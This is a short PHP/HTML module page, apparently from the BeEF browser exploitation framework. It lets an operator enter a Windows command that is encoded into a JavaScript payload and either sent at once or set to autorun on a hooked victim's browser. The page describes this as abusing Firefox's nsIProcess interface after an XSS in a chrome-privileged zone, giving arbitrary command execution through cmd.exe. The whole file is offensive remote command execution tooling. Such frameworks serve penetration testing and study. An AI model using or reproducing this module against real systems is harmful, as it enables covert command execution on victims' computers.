<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>

	get_b64_code_alert = function () {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "BEEFCOMMAND", document.myform.command_str.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Mozilla nsIProcess Interface', get_b64_code_alert());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_alert());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Mozilla nsIProcess XPCOM Interface (Windows)</div>

The nsIProcess XPCOM interface represents an executable process. JavaScript 
code with chrome privileges can use the nsIProcess interface to launch 
executable files. In this module, nsIProcess is combined with the Windows 
command prompt cmd.exe. 
<br><br>
Any XSS injection in a chrome privileged zone (e.g. typically in Firefox 
extensions) allows his module to execute arbitrary commands on the victim 
machine.
<br><br>
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Windows Command</div>
		<input type="text" width="90%" name="command_str" value="ping localhost"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>
